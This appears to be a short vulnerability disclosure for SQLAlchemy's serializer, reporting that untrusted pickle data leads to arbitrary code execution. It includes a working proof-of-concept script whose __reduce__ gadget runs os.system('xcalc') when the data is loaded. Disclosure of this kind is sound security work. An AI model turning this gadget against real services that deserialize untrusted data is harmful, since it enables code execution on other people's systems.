# Description
SQLAlchemy is the Python SQL toolkit and Object Relational Mapper that gives application developers the full power and flexibility of SQL. SQLAlchemy provides a full suite of well known enterprise-level persistence patterns, designed for efficient and high-performing database access, adapted into a simple and Pythonic domain language. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install sqlalchemy')
from sqlalchemy.ext import serializer
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
serializer.loads(dumps,dumps)
```
* `pip3 install sqlalchemy`
* `python3 exploit.py`
